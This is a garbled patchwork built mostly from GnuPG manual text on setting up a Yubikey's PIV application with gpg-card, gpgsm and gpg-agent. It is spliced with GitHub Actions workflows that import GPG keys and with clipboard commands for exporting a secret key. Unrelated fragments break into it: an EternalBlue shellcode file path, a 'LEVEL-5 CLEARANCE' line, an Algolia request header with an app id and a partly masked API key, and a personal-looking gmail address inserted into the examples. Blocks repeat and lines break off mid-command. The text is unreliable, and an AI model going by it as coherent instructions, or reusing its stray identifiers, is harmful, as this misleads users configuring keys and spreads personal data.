+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

